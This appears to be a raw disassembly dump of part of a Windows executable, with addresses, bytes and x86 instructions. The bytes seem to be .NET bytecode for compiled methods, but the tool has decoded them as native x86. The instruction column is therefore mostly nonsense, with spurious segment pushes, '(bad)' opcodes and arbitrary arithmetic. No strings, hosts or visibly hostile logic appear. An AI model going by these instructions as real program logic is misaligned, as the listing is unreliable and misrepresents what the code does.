  404dca:	04 02                	add    $0x2,%al
  404dcc:	14 7d                	adc    $0x7d,%al
  404dce:	76 00                	jbe    0x404dd0
  404dd0:	00 04 02             	add    %al,(%edx,%eax,1)
  404dd3:	7c 73                	jl     0x404e48
  404dd5:	00 00                	add    %al,(%eax)
  404dd7:	04 08                	add    $0x8,%al
  404dd9:	28 95 00 00 0a 2a    	sub    %dl,0x2a0a0000(%ebp)
  404ddf:	00 41 1c             	add    %al,0x1c(%ecx)
  404de2:	00 00                	add    %al,(%eax)
  404de4:	00 00                	add    %al,(%eax)
  404de6:	00 00                	add    %al,(%eax)
  404de8:	0e                   	push   %cs
  404de9:	00 00                	add    %al,(%eax)
  404deb:	00 0d 01 00 00 1b    	add    %cl,0x1b000001
  404df1:	01 00                	add    %eax,(%eax)
  404df3:	00 20                	add    %ah,(%eax)
  404df5:	00 00                	add    %al,(%eax)
  404df7:	00 0b                	add    %cl,(%ebx)
  404df9:	00 00                	add    %al,(%eax)
  404dfb:	01 1b                	add    %ebx,(%ebx)
  404dfd:	30 05 00 c2 02 00    	xor    %al,0x2c200
  404e03:	00 27                	add    %ah,(%edi)
  404e05:	00 00                	add    %al,(%eax)
  404e07:	11 02                	adc    %eax,(%edx)
  404e09:	7b 7a                	jnp    0x404e85
  404e0b:	00 00                	add    %al,(%eax)
  404e0d:	04 0a                	add    $0xa,%al
  404e0f:	02 7b 7d             	add    0x7d(%ebx),%bh
  404e12:	00 00                	add    %al,(%eax)
  404e14:	04 0b                	add    $0xb,%al
  404e16:	06                   	push   %es
  404e17:	45                   	inc    %ebp
  404e18:	03 00                	add    (%eax),%eax
  404e1a:	00 00                	add    %al,(%eax)
  404e1c:	bb 00 00 00 c0       	mov    $0xc0000000,%ebx
  404e21:	01 00                	add    %eax,(%eax)
  404e23:	00 28                	add    %ch,(%eax)
  404e25:	02 00                	add    (%eax),%al
  404e27:	00 02                	add    %al,(%edx)
  404e29:	02 7b 7c             	add    0x7c(%ebx),%bh
  404e2c:	00 00                	add    %al,(%eax)
  404e2e:	04 8d                	add    $0x8d,%al
  404e30:	2e 00 00             	add    %al,%cs:(%eax)
  404e33:	01 7d 7e             	add    %edi,0x7e(%ebp)
  404e36:	00 00                	add    %al,(%eax)
  404e38:	04 02                	add    $0x2,%al
  404e3a:	16                   	push   %ss
  404e3b:	7d 7f                	jge    0x404ebc
  404e3d:	00 00                	add    %al,(%eax)
  404e3f:	04 02                	add    $0x2,%al
  404e41:	02 7b 7c             	add    0x7c(%ebx),%bh
  404e44:	00 00                	add    %al,(%eax)
  404e46:	04 7d                	add    $0x7d,%al
  404e48:	80 00 00             	addb   $0x0,(%eax)
  404e4b:	04 02                	add    $0x2,%al
  404e4d:	28 a4 00 00 0a 7d 81 	sub    %ah,-0x7e82f600(%eax,%eax,1)
  404e54:	00 00                	add    %al,(%eax)
  404e56:	04 02                	add    $0x2,%al
  404e58:	28 a4 00 00 0a 7d 82 	sub    %ah,-0x7d82f600(%eax,%eax,1)
  404e5f:	00 00                	add    %al,(%eax)
  404e61:	04 38                	add    $0x38,%al
  404e63:	0d 02 00 00 07       	or     $0x7000002,%eax
  404e68:	7b 6f                	jnp    0x404ed9
  404e6a:	00 00                	add    %al,(%eax)
  404e6c:	04 6f                	add    $0x6f,%al
  404e6e:	73 00                	jae    0x404e70
  404e70:	00 0a                	add    %cl,(%edx)
  404e72:	2d 07 14 0c dd       	sub    $0xdd0c1407,%eax
  404e77:	33 02                	xor    (%edx),%eax
  404e79:	00 00                	add    %al,(%eax)
  404e7b:	07                   	pop    %es
  404e7c:	7b 6f                	jnp    0x404eed
  404e7e:	00 00                	add    %al,(%eax)
  404e80:	04 6f                	add    $0x6f,%al
  404e82:	aa                   	stos   %al,%es:(%edi)
  404e83:	00 00                	add    %al,(%eax)
  404e85:	0a 16                	or     (%esi),%dl
  404e87:	3e ac                	lods   %ds:(%esi),%al
  404e89:	00 00                	add    %al,(%eax)
  404e8b:	00 07                	add    %al,(%edi)
  404e8d:	7b 6f                	jnp    0x404efe
  404e8f:	00 00                	add    %al,(%eax)
  404e91:	04 02                	add    $0x2,%al
  404e93:	7b 7e                	jnp    0x404f13
  404e95:	00 00                	add    %al,(%eax)
  404e97:	04 02                	add    $0x2,%al
  404e99:	7b 7f                	jnp    0x404f1a
  404e9b:	00 00                	add    %al,(%eax)
  404e9d:	04 02                	add    $0x2,%al
  404e9f:	7b 80                	jnp    0x404e21
  404ea1:	00 00                	add    %al,(%eax)
  404ea3:	04 73                	add    $0x73,%al
  404ea5:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  404ea6:	00 00                	add    %al,(%eax)
  404ea8:	0a 16                	or     (%esi),%dl
  404eaa:	28 a6 00 00 0a 6f    	sub    %ah,0x6f0a0000(%esi)
  404eb0:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  404eb1:	00 00                	add    %al,(%eax)
  404eb3:	0a 13                	or     (%ebx),%dl
  404eb5:	04 12                	add    $0x12,%al
  404eb7:	04 28                	add    $0x28,%al
  404eb9:	a8 00                	test   $0x0,%al
  404ebb:	00 0a                	add    %cl,(%edx)
  404ebd:	2d 41 02 16 25       	sub    $0x25160241,%eax
  404ec2:	0a 7d 7a             	or     0x7a(%ebp),%bh
  404ec5:	00 00                	add    %al,(%eax)
  404ec7:	04 02                	add    $0x2,%al
  404ec9:	11 04 7d 83 00 00 04 	adc    %eax,0x4000083(,%edi,2)
  404ed0:	02 7c 7b 00          	add    0x0(%ebx,%edi,2),%bh
  404ed4:	00 04 12             	add    %al,(%edx,%edx,1)
  404ed7:	04 02                	add    $0x2,%al
  404ed9:	28 35 00 00 2b dd    	sub    %dh,0xdd2b0000
  404edf:	e6 01                	out    %al,$0x1
  404ee1:	00 00                	add    %al,(%eax)
  404ee3:	02 7b 83             	add    -0x7d(%ebx),%bh
  404ee6:	00 00                	add    %al,(%eax)
  404ee8:	04 13                	add    $0x13,%al
  404eea:	04 02                	add    $0x2,%al
  404eec:	7c 83                	jl     0x404e71
  404eee:	00 00                	add    %al,(%eax)
  404ef0:	04 fe                	add    $0xfe,%al
  404ef2:	15 18 00 00 1b       	adc    $0x1b000018,%eax
  404ef7:	02 15 25 0a 7d 7a    	add    0x7a7d0a25,%dl
  404efd:	00 00                	add    %al,(%eax)
  404eff:	04 12                	add    $0x12,%al
  404f01:	04 28                	add    $0x28,%al
  404f03:	a9 00 00 0a 0d       	test   $0xd0a0000,%eax
  404f08:	09 2d 0c 02 14 7d    	or     %ebp,0x7d14020c
  404f0e:	7e 00                	jle    0x404f10
  404f10:	00 04 38             	add    %al,(%eax,%edi,1)
  404f13:	6e                   	outsb  %ds:(%esi),(%dx)
  404f14:	01 00                	add    %eax,(%eax)
  404f16:	00 02                	add    %al,(%edx)
  404f18:	02 7b 7f             	add    0x7f(%ebx),%bh
  404f1b:	00 00                	add    %al,(%eax)
  404f1d:	04 09                	add    $0x9,%al
  404f1f:	58                   	pop    %eax
  404f20:	7d 7f                	jge    0x404fa1
  404f22:	00 00                	add    %al,(%eax)
  404f24:	04 02                	add    $0x2,%al
  404f26:	02 7b 80             	add    -0x80(%ebx),%bh
  404f29:	00 00                	add    %al,(%eax)
  404f2b:	04 09                	add    $0x9,%al
  404f2d:	59                   	pop    %ecx
  404f2e:	7d 80                	jge    0x404eb0
  404f30:	00 00                	add    %al,(%eax)
  404f32:	04 38                	add    $0x38,%al
  404f34:	3c 01                	cmp    $0x1,%al
  404f36:	00 00                	add    %al,(%eax)
  404f38:	07                   	pop    %es
  404f39:	7b 71                	jnp    0x404fac
  404f3b:	00 00                	add    %al,(%eax)
  404f3d:	04 2c                	add    $0x2c,%al
  404f3f:	2e 28 a4 00 00 0a 02 	sub    %ah,%cs:0x7b020a00(%eax,%eax,1)
  404f46:	7b 
  404f47:	81 00 00 04 28 ab    	addl   $0xab280400,(%eax)
  404f4d:	00 00                	add    %al,(%eax)
  404f4f:	0a 13                	or     (%ebx),%dl
  404f51:	06                   	push   %es
  404f52:	12 06                	adc    (%esi),%al
  404f54:	28 ac 00 00 0a 07 7b 	sub    %ch,0x7b070a00(%eax,%eax,1)
  404f5b:	71 00                	jno    0x404f5d
  404f5d:	00 04 6c             	add    %al,(%esp,%ebp,2)
  404f60:	37                   	aaa
  404f61:	0c 02                	or     $0x2,%al
  404f63:	14 7d                	adc    $0x7d,%al
  404f65:	7e 00                	jle    0x404f67
  404f67:	00 04 38             	add    %al,(%eax,%edi,1)
  404f6a:	17                   	pop    %ss
  404f6b:	01 00                	add    %eax,(%eax)
  404f6d:	00 28                	add    %ch,(%eax)
  404f6f:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  404f70:	00 00                	add    %al,(%eax)
  404f72:	0a 02                	or     (%edx),%al
  404f74:	7b 82                	jnp    0x404ef8
  404f76:	00 00                	add    %al,(%eax)
  404f78:	04 28                	add    $0x28,%al
  404f7a:	ab                   	stos   %eax,%es:(%edi)
  404f7b:	00 00                	add    %al,(%eax)
  404f7d:	0a 13                	or     (%ebx),%dl
  404f7f:	05 12 05 28 ac       	add    $0xac280512,%eax
  404f84:	00 00                	add    %al,(%eax)
  404f86:	0a 23                	or     (%ebx),%ah
  404f88:	00 00                	add    %al,(%eax)
  404f8a:	00 00                	add    %al,(%eax)
  404f8c:	00 70 97             	add    %dh,-0x69(%eax)
  404f8f:	40                   	inc    %eax
  404f90:	44                   	inc    %esp
  404f91:	83 00 00             	addl   $0x0,(%eax)
  404f94:	00 07                	add    %al,(%edi)
  404f96:	7b 6f                	jnp    0x405007
  404f98:	00 00                	add    %al,(%eax)
  404f9a:	04 1b                	add    $0x1b,%al
  404f9c:	8d 2e                	lea    (%esi),%ebp
  404f9e:	00 00                	add    %al,(%eax)
  404fa0:	01 25 16 17 9c 25    	add    %esp,0x259c1716
  404fa6:	1a 18                	sbb    (%eax),%bl
  404fa8:	9c                   	pushf
  404fa9:	73 ad                	jae    0x404f58
  404fab:	00 00                	add    %al,(%eax)
  404fad:	0a 16                	or     (%esi),%dl
  404faf:	28 ae 00 00 0a 6f    	sub    %ch,0x6f0a0000(%esi)
  404fb5:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  404fb6:	00 00                	add    %al,(%eax)
  404fb8:	0a 13                	or     (%ebx),%dl
  404fba:	04 12                	add    $0x12,%al
  404fbc:	04 28                	add    $0x28,%al
  404fbe:	a8 00                	test   $0x0,%al
  404fc0:	00 0a                	add    %cl,(%edx)
  404fc2:	2d 41 02 17 25       	sub    $0x25170241,%eax
  404fc7:	0a 7d 7a             	or     0x7a(%ebp),%bh
  404fca:	00 00                	add    %al,(%eax)
  404fcc:	04 02                	add    $0x2,%al
  404fce:	11 04 7d 83 00 00 04 	adc    %eax,0x4000083(,%edi,2)
  404fd5:	02 7c 7b 00          	add    0x0(%ebx,%edi,2),%bh
  404fd9:	00 04 12             	add    %al,(%edx,%edx,1)
  404fdc:	04 02                	add    $0x2,%al
  404fde:	28 35 00 00 2b dd    	sub    %dh,0xdd2b0000
  404fe4:	e1 00                	loope  0x404fe6
  404fe6:	00 00                	add    %al,(%eax)
  404fe8:	02 7b 83             	add    -0x7d(%ebx),%bh
  404feb:	00 00                	add    %al,(%eax)
  404fed:	04 13                	add    $0x13,%al
  404fef:	04 02                	add    $0x2,%al
  404ff1:	7c 83                	jl     0x404f76
  404ff3:	00 00                	add    %al,(%eax)
  404ff5:	04 fe                	add    $0xfe,%al
  404ff7:	15 18 00 00 1b       	adc    $0x1b000018,%eax
  404ffc:	02 15 25 0a 7d 7a    	add    0x7a7d0a25,%dl
  405002:	00 00                	add    %al,(%eax)
  405004:	04 12                	add    $0x12,%al
  405006:	04 28                	add    $0x28,%al
  405008:	a9 00 00 0a 26       	test   $0x260a0000,%eax
  40500d:	02 28                	add    (%eax),%ch
  40500f:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  405010:	00 00                	add    %al,(%eax)
  405012:	0a 7d 82             	or     -0x7e(%ebp),%bh
  405015:	00 00                	add    %al,(%eax)
  405017:	04 1f                	add    $0x1f,%al
  405019:	0a 28                	or     (%eax),%ch
  40501b:	5c                   	pop    %esp
  40501c:	00 00                	add    %al,(%eax)
  40501e:	0a 6f 37             	or     0x37(%edi),%ch
  405021:	00 00                	add    %al,(%eax)
  405023:	0a 13                	or     (%ebx),%dl
  405025:	07                   	pop    %es
  405026:	12 07                	adc    (%edi),%al
  405028:	28 38                	sub    %bh,(%eax)
  40502a:	00 00                	add    %al,(%eax)
  40502c:	0a 2d 3e 02 18 25    	or     0x2518023e,%ch
  405032:	0a 7d 7a             	or     0x7a(%ebp),%bh
  405035:	00 00                	add    %al,(%eax)
  405037:	04 02                	add    $0x2,%al
  405039:	11 07                	adc    %eax,(%edi)
  40503b:	7d 84                	jge    0x404fc1
  40503d:	00 00                	add    %al,(%eax)
  40503f:	04 02                	add    $0x2,%al
  405041:	7c 7b                	jl     0x4050be
  405043:	00 00                	add    %al,(%eax)
  405045:	04 12                	add    $0x12,%al
  405047:	07                   	pop    %es
  405048:	02 28                	add    (%eax),%ch
  40504a:	36 00 00             	add    %al,%ss:(%eax)
  40504d:	2b de                	sub    %esi,%ebx
  40504f:	79 02                	jns    0x405053
  405051:	7b 84                	jnp    0x404fd7
  405053:	00 00                	add    %al,(%eax)
  405055:	04 13                	add    $0x13,%al
  405057:	07                   	pop    %es
  405058:	02 7c 84 00          	add    0x0(%esp,%eax,4),%bh
  40505c:	00 04 fe             	add    %al,(%esi,%edi,8)
  40505f:	15 0a 00 00 01       	adc    $0x100000a,%eax
  405064:	02 15 25 0a 7d 7a    	add    0x7a7d0a25,%dl
  40506a:	00 00                	add    %al,(%eax)
  40506c:	04 12                	add    $0x12,%al
  40506e:	07                   	pop    %es
  40506f:	28 39                	sub    %bh,(%ecx)
  405071:	00 00                	add    %al,(%eax)
  405073:	0a 02                	or     (%edx),%al
  405075:	7b 7f                	jnp    0x4050f6
  405077:	00 00                	add    %al,(%eax)
  405079:	04 02                	add    $0x2,%al
  40507b:	7b 7c                	jnp    0x4050f9
  40507d:	00 00                	add    %al,(%eax)
  40507f:	04 3f                	add    $0x3f,%al
  405081:	e2 fd                	loop   0x405080
  405083:	ff                   	(bad)
  405084:	ff 02                	incl   (%edx)
  405086:	7b 7e                	jnp    0x405106
  405088:	00 00                	add    %al,(%eax)
  40508a:	04 0c                	add    $0xc,%al
  40508c:	de 20                	fisubs (%eax)
  40508e:	13 08                	adc    (%eax),%ecx
  405090:	02 1f                	add    (%edi),%bl
  405092:	fe                   	(bad)
  405093:	7d 7a                	jge    0x40510f
  405095:	00 00                	add    %al,(%eax)
  405097:	04 02                	add    $0x2,%al
  405099:	14 7d                	adc    $0x7d,%al
  40509b:	7e 00                	jle    0x40509d
  40509d:	00 04 02             	add    %al,(%edx,%eax,1)
  4050a0:	7c 7b                	jl     0x40511d
  4050a2:	00 00                	add    %al,(%eax)
  4050a4:	04 11                	add    $0x11,%al
  4050a6:	08 28                	or     %ch,(%eax)
  4050a8:	94                   	xchg   %eax,%esp
  4050a9:	00 00                	add    %al,(%eax)
  4050ab:	0a de                	or     %dh,%bl
  4050ad:	1b 02                	sbb    (%edx),%eax
  4050af:	1f                   	pop    %ds
  4050b0:	fe                   	(bad)
  4050b1:	7d 7a                	jge    0x40512d
  4050b3:	00 00                	add    %al,(%eax)
  4050b5:	04 02                	add    $0x2,%al
  4050b7:	14 7d                	adc    $0x7d,%al
  4050b9:	7e 00                	jle    0x4050bb
  4050bb:	00 04 02             	add    %al,(%edx,%eax,1)
  4050be:	7c 7b                	jl     0x40513b
  4050c0:	00 00                	add    %al,(%eax)
  4050c2:	04 08                	add    $0x8,%al
  4050c4:	28 95 00 00 0a 2a    	sub    %dl,0x2a0a0000(%ebp)
  4050ca:	00 00                	add    %al,(%eax)
  4050cc:	41                   	inc    %ecx
  4050cd:	1c 00                	sbb    $0x0,%al
  4050cf:	00 00                	add    %al,(%eax)
  4050d1:	00 00                	add    %al,(%eax)
  4050d3:	00 0e                	add    %cl,(%esi)
  4050d5:	00 00                	add    %al,(%eax)
  4050d7:	00 78 02             	add    %bh,0x2(%eax)
  4050da:	00 00                	add    %al,(%eax)
  4050dc:	86 02                	xchg   %al,(%edx)
  4050de:	00 00                	add    %al,(%eax)
  4050e0:	20 00                	and    %al,(%eax)
  4050e2:	00 00                	add    %al,(%eax)
  4050e4:	0b 00                	or     (%eax),%eax
  4050e6:	00 01                	add    %al,(%ecx)
  4050e8:	1b 30                	sbb    (%eax),%esi
  4050ea:	05 00 8c 01 00       	add    $0x18c00,%eax
  4050ef:	00 28                	add    %ch,(%eax)
  4050f1:	00 00                	add    %al,(%eax)
  4050f3:	11 02                	adc    %eax,(%edx)
  4050f5:	7b 87                	jnp    0x40507e
  4050f7:	00 00                	add    %al,(%eax)
  4050f9:	04 0a                	add    $0xa,%al
  4050fb:	02 7b 8a             	add    -0x76(%ebx),%bh
  4050fe:	00 00                	add    %al,(%eax)
  405100:	04 0b                	add    $0xb,%al
  405102:	06                   	push   %es
  405103:	2c 18                	sub    $0x18,%al
  405105:	02 7b 89             	add    -0x77(%ebx),%bh
  405108:	00 00                	add    %al,(%eax)
  40510a:	04 2d                	add    $0x2d,%al
  40510c:	10 72 81             	adc    %dh,-0x7f(%edx)
  40510f:	00 00                	add    %al,(%eax)
  405111:	70 72                	jo     0x405185
  405113:	8b 00                	mov    (%eax),%eax
  405115:	00 70 73             	add    %dh,0x73(%eax)
  405118:	af                   	scas   %es:(%edi),%eax
  405119:	00 00                	add    %al,(%eax)
  40511b:	0a 7a 00             	or     0x0(%edx),%bh
  40511e:	06                   	push   %es
  40511f:	39 00                	cmp    %eax,(%eax)
  405121:	01 00                	add    %eax,(%eax)
  405123:	00 02                	add    %al,(%edx)
  405125:	7b 89                	jnp    0x4050b0
  405127:	00 00                	add    %al,(%eax)
  405129:	04 28                	add    $0x28,%al
  40512b:	06                   	push   %es
  40512c:	00 00                	add    %al,(%eax)
  40512e:	06                   	push   %es
  40512f:	0d 16 13 04 02       	or     $0x2041316,%eax
  405134:	7b 89                	jnp    0x4050bf
  405136:	00 00                	add    %al,(%eax)
  405138:	04 8e                	add    $0x8e,%al
  40513a:	69 13 05 09 2c 11    	imul   $0x112c0905,(%ebx),%edx
  405140:	09 8e 69 11 05 2f    	or     %ecx,0x2f051169(%esi)
  405146:	0a 02                	or     (%edx),%al
  405148:	09 7d 89             	or     %edi,-0x77(%ebp)
  40514b:	00 00                	add    %al,(%eax)
  40514d:	04 17                	add    $0x17,%al
  40514f:	13 04 17             	adc    (%edi,%edx,1),%eax
  405152:	8d 2e                	lea    (%esi),%ebp
  405154:	00 00                	add    %al,(%eax)
  405156:	01 25 16 11 04 9c    	add    %esp,0x9c041116
  40515c:	13 06                	adc    (%esi),%eax
  40515e:	11 04 17             	adc    %eax,(%edi,%edx,1)
  405161:	33 11                	xor    (%ecx),%edx
  405163:	11 06                	adc    %eax,(%esi)
  405165:	07                   	pop    %es
  405166:	11 05 28 4b 00 00    	adc    %eax,0x4b28
  40516c:	06                   	push   %es
  40516d:	28 45 00             	sub    %al,0x0(%ebp)
  405170:	00 06                	add    %al,(%esi)
  405172:	13 06                	adc    (%esi),%eax
  405174:	02 11                	add    (%ecx),%dl
  405176:	06                   	push   %es
  405177:	02 7b 89             	add    -0x77(%ebx),%bh
  40517a:	00 00                	add    %al,(%eax)
  40517c:	04 28                	add    $0x28,%al
  40517e:	45                   	inc    %ebp
  40517f:	00 00                	add    %al,(%eax)
  405181:	06                   	push   %es
  405182:	7d 89                	jge    0x40510d
  405184:	00 00                	add    %al,(%eax)
  405186:	04 02                	add    $0x2,%al
  405188:	02 7b 89             	add    -0x77(%ebx),%bh
  40518b:	00 00                	add    %al,(%eax)
  40518d:	04 07                	add    $0x7,%al
  40518f:	7b 70                	jnp    0x405201
  405191:	00 00                	add    %al,(%eax)
  405193:	04 28                	add    $0x28,%al
  405195:	0e                   	push   %cs
  405196:	00 00                	add    %al,(%eax)
  405198:	06                   	push   %es
  405199:	7d 89                	jge    0x405124
  40519b:	00 00                	add    %al,(%eax)
  40519d:	04 02                	add    $0x2,%al
  40519f:	17                   	pop    %ss
  4051a0:	8d 2e                	lea    (%esi),%ebp
  4051a2:	00 00                	add    %al,(%eax)
  4051a4:	01 25 16 19 9c 02    	add    %esp,0x29c1916
  4051aa:	7b 89                	jnp    0x405135
  4051ac:	00 00                	add    %al,(%eax)
  4051ae:	04 28                	add    $0x28,%al
  4051b0:	45                   	inc    %ebp
  4051b1:	00 00                	add    %al,(%eax)
  4051b3:	06                   	push   %es
  4051b4:	7d 89                	jge    0x40513f
  4051b6:	00 00                	add    %al,(%eax)
  4051b8:	04 07                	add    $0x7,%al
  4051ba:	02 7b 89             	add    -0x77(%ebx),%bh
  4051bd:	00 00                	add    %al,(%eax)
  4051bf:	04 8e                	add    $0x8e,%al
  4051c1:	69 28 4b 00 00 06    	imul   $0x600004b,(%eax),%ebp
  4051c7:	13 07                	adc    (%edi),%eax
  4051c9:	02 11                	add    (%ecx),%dl
  4051cb:	07                   	pop    %es
  4051cc:	02 7b 89             	add    -0x77(%ebx),%bh
  4051cf:	00 00                	add    %al,(%eax)
  4051d1:	04 28                	add    $0x28,%al
  4051d3:	45                   	inc    %ebp
  4051d4:	00 00                	add    %al,(%eax)
  4051d6:	06                   	push   %es
  4051d7:	7d 89                	jge    0x405162
  4051d9:	00 00                	add    %al,(%eax)
  4051db:	04 07                	add    $0x7,%al
  4051dd:	7b 6f                	jnp    0x40524e
  4051df:	00 00                	add    %al,(%eax)
  4051e1:	04 02                	add    $0x2,%al
  4051e3:	7b 89                	jnp    0x40516e
  4051e5:	00 00                	add    %al,(%eax)
  4051e7:	04 73                	add    $0x73,%al
  4051e9:	ad                   	lods   %ds:(%esi),%eax
  4051ea:	00 00                	add    %al,(%eax)
  4051ec:	0a 16                	or     (%esi),%dl
  4051ee:	28 ae 00 00 0a 6f    	sub    %ch,0x6f0a0000(%esi)
  4051f4:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4051f5:	00 00                	add    %al,(%eax)
  4051f7:	0a 13                	or     (%ebx),%dl
  4051f9:	08 12                	or     %dl,(%edx)
  4051fb:	08 28                	or     %ch,(%eax)
  4051fd:	a8 00                	test   $0x0,%al
  4051ff:	00 0a                	add    %cl,(%edx)
  405201:	2d 3e 02 16 25       	sub    $0x2516023e,%eax
  405206:	0a 7d 87             	or     -0x79(%ebp),%bh
  405209:	00 00                	add    %al,(%eax)
  40520b:	04 02                	add    $0x2,%al
  40520d:	11 08                	adc    %ecx,(%eax)
  40520f:	7d 8b                	jge    0x40519c
  405211:	00 00                	add    %al,(%eax)
  405213:	04 02                	add    $0x2,%al
  405215:	7c 88                	jl     0x40519f
  405217:	00 00                	add    %al,(%eax)
  405219:	04 12                	add    $0x12,%al
  40521b:	08 02                	or     %al,(%edx)
  40521d:	28 37                	sub    %dh,(%edi)
  40521f:	00 00                	add    %al,(%eax)
  405221:	2b de                	sub    %esi,%ebx
  405223:	5b                   	pop    %ebx
  405224:	02 7b 8b             	add    -0x75(%ebx),%bh
  405227:	00 00                	add    %al,(%eax)
  405229:	04 13                	add    $0x13,%al
  40522b:	08 02                	or     %al,(%edx)
  40522d:	7c 8b                	jl     0x4051ba
  40522f:	00 00                	add    %al,(%eax)
  405231:	04 fe                	add    $0xfe,%al
  405233:	15 18 00 00 1b       	adc    $0x1b000018,%eax
  405238:	02 15 25 0a 7d 87    	add    0x877d0a25,%dl
  40523e:	00 00                	add    %al,(%eax)
  405240:	04 12                	add    $0x12,%al
  405242:	08 28                	or     %ch,(%eax)
  405244:	a9 00 00 0a 26       	test   $0x260a0000,%eax
  405249:	17                   	pop    %ss
  40524a:	0c de                	or     $0xde,%al
  40524c:	1e                   	push   %ds
  40524d:	26 16                	es push %ss
  40524f:	0c de                	or     $0xde,%al
  405251:	19 13                	sbb    %edx,(%ebx)
  405253:	09 02                	or     %eax,(%edx)
  405255:	1f                   	pop    %ds
  405256:	fe                   	(bad)
  405257:	7d 87                	jge    0x4051e0
  405259:	00 00                	add    %al,(%eax)
  40525b:	04 02                	add    $0x2,%al
  40525d:	7c 88                	jl     0x4051e7
  40525f:	00 00                	add    %al,(%eax)
  405261:	04 11                	add    $0x11,%al
  405263:	09 28                	or     %ebp,(%eax)
  405265:	98                   	cwtl
  405266:	00 00                	add    %al,(%eax)
  405268:	0a de                	or     %dh,%bl
  40526a:	14 02                	adc    $0x2,%al
  40526c:	1f                   	pop    %ds
  40526d:	fe                   	(bad)
  40526e:	7d 87                	jge    0x4051f7
  405270:	00 00                	add    %al,(%eax)
  405272:	04 02                	add    $0x2,%al
  405274:	7c 88                	jl     0x4051fe
  405276:	00 00                	add    %al,(%eax)
  405278:	04 08                	add    $0x8,%al
  40527a:	28 99 00 00 0a 2a    	sub    %bl,0x2a0a0000(%ecx)
  405280:	41                   	inc    %ecx
  405281:	34 00                	xor    $0x0,%al
  405283:	00 00                	add    %al,(%eax)
  405285:	00 00                	add    %al,(%eax)
  405287:	00 2a                	add    %ch,(%edx)
  405289:	00 00                	add    %al,(%eax)
  40528b:	00 2f                	add    %ch,(%edi)
  40528d:	01 00                	add    %eax,(%eax)
  40528f:	00 59 01             	add    %bl,0x1(%ecx)
  405292:	00 00                	add    %al,(%eax)
  405294:	05 00 00 00 01       	add    $0x1000000,%eax
  405299:	00 00                	add    %al,(%eax)
  40529b:	01 00                	add    %eax,(%eax)
  40529d:	00 00                	add    %al,(%eax)
  40529f:	00 0e                	add    %cl,(%esi)
  4052a1:	00 00                	add    %al,(%eax)
  4052a3:	00 50 01             	add    %dl,0x1(%eax)
  4052a6:	00 00                	add    %al,(%eax)
  4052a8:	5e                   	pop    %esi
  4052a9:	01 00                	add    %eax,(%eax)
  4052ab:	00 19                	add    %bl,(%ecx)
  4052ad:	00 00                	add    %al,(%eax)
  4052af:	00 0b                	add    %cl,(%ebx)
  4052b1:	00 00                	add    %al,(%eax)
  4052b3:	01 1b                	add    %ebx,(%ebx)
  4052b5:	30 03                	xor    %al,(%ebx)
  4052b7:	00 fa                	add    %bh,%dl
  4052b9:	01 00                	add    %eax,(%eax)
  4052bb:	00 29                	add    %ch,(%ecx)
  4052bd:	00 00                	add    %al,(%eax)
  4052bf:	11 02                	adc    %eax,(%edx)
  4052c1:	7b 8c                	jnp    0x40524f
  4052c3:	00 00                	add    %al,(%eax)
  4052c5:	04 0a                	add    $0xa,%al
  4052c7:	02 7b 8e             	add    -0x72(%ebx),%bh
  4052ca:	00 00                	add    %al,(%eax)
  4052cc:	04 0b                	add    $0xb,%al
  4052ce:	06                   	push   %es
  4052cf:	17                   	pop    %ss
  4052d0:	26 26 00 06          	es add %al,%es:(%esi)
  4052d4:	2c 42                	sub    $0x42,%al
  4052d6:	06                   	push   %es
  4052d7:	17                   	pop    %ss
  4052d8:	3b b0 00 00 00 07    	cmp    0x7000000(%eax),%esi
  4052de:	1a 28                	sbb    (%eax),%ch
  4052e0:	43                   	inc    %ebx
  4052e1:	00 00                	add    %al,(%eax)
  4052e3:	06                   	push   %es
  4052e4:	6f                   	outsl  %ds:(%esi),(%dx)
  4052e5:	23 00                	and    (%eax),%eax
  4052e7:	00 0a                	add    %cl,(%edx)
  4052e9:	13 07                	adc    (%edi),%eax
  4052eb:	12 07                	adc    (%edi),%al
  4052ed:	28 24 00             	sub    %ah,(%eax,%eax,1)
  4052f0:	00 0a                	add    %cl,(%edx)
  4052f2:	2d 41 02 16 25       	sub    $0x25160241,%eax
  4052f7:	0a 7d 8c             	or     -0x74(%ebp),%bh
  4052fa:	00 00                	add    %al,(%eax)
  4052fc:	04 02                	add    $0x2,%al
  4052fe:	11 07                	adc    %eax,(%edi)
  405300:	7d 8f                	jge    0x405291
  405302:	00 00                	add    %al,(%eax)
  405304:	04 02                	add    $0x2,%al
  405306:	7c 8d                	jl     0x405295
  405308:	00 00                	add    %al,(%eax)
  40530a:	04 12                	add    $0x12,%al
  40530c:	07                   	pop    %es
  40530d:	02 28                	add    (%eax),%ch
  40530f:	38 00                	cmp    %al,(%eax)
  405311:	00 2b                	add    %ch,(%ebx)
  405313:	dd a1 01 00 00 02    	frstor 0x2000001(%ecx)
  405319:	7b 8f                	jnp    0x4052aa
  40531b:	00 00                	add    %al,(%eax)
  40531d:	04 13                	add    $0x13,%al
  40531f:	07                   	pop    %es
  405320:	02 7c 8f 00          	add    0x0(%edi,%ecx,4),%bh
  405324:	00 04 fe             	add    %al,(%esi,%edi,8)
  405327:	15 03 00 00 1b       	adc    $0x1b000003,%eax
  40532c:	02 15 25 0a 7d 8c    	add    0x8c7d0a25,%dl
  405332:	00 00                	add    %al,(%eax)
  405334:	04 12                	add    $0x12,%al
  405336:	07                   	pop    %es
  405337:	28 26                	sub    %ah,(%esi)
  405339:	00 00                	add    %al,(%eax)
  40533b:	0a 0d 09 2d 07 14    	or     0x14072d09,%cl
  405341:	0c dd                	or     $0xdd,%al
  405343:	5e                   	pop    %esi
  405344:	01 00                	add    %eax,(%eax)
  405346:	00 07                	add    %al,(%edi)
  405348:	09 16                	or     %edx,(%esi)
  40534a:	28 4a 00             	sub    %cl,0x0(%edx)
  40534d:	00 06                	add    %al,(%esi)
  40534f:	13 04 07             	adc    (%edi,%eax,1),%eax
  405352:	11 04 28             	adc    %eax,(%eax,%ebp,1)
  405355:	43                   	inc    %ebx
  405356:	00 00                	add    %al,(%eax)
  405358:	06                   	push   %es
  405359:	6f                   	outsl  %ds:(%esi),(%dx)
  40535a:	23 00                	and    (%eax),%eax
  40535c:	00 0a                	add    %cl,(%edx)
  40535e:	13 07                	adc    (%edi),%eax
  405360:	12 07                	adc    (%edi),%al
